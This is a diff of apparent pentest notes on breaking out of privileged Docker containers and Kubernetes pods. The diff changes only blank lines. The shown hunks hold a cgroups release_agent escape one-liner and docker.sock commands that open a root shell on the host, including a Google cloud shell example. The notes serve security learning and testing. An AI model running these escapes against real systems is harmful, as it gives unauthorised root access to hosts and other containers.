@@ -4,11 +4,7 @@
 
 Docker runs with root rights. Even when it's running within the docker group. The docker communicates with the containers through a unix socket.
 
-
-
 Docker in docker is fairly common. To do this the host's docker socket has to be mounted in the docker container (there are other ways, but this is the most common one).  Used in e.g. Portainer.
-
-
 
 The `--privileged` flag exploit relies on relaunching a docker container with this flag. When using this flag, containers have full access to all devices and lack restrictions from sccomp, AppArmor and Linux capabilities
 
@@ -28,8 +24,6 @@ Default unix socket:
 
     /var/run/docker.sock
 
-
-
 ## Quick and dirty way to get out of a privileged k8s pod or docker container
 
 Using cgroups release_agent feature:
@@ -47,8 +41,6 @@ t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
 $1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
 ```
-
-
 
 ## Example escape from google k8s
 
@@ -72,18 +64,13 @@ sudo docker -H unix://<socker socket> exec -it <containername> /bin/sh
 chroot /rootfs
 # You are now in a container with a lot more privileges
 docker ps #(will list all docker containers on host)
-
 ```
-
-
 
 Example - escape docker cloud shell to host OS
 
 ```bash
 sudodocker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host/bin/bash
 ```
-
-
 
 Sources:
 
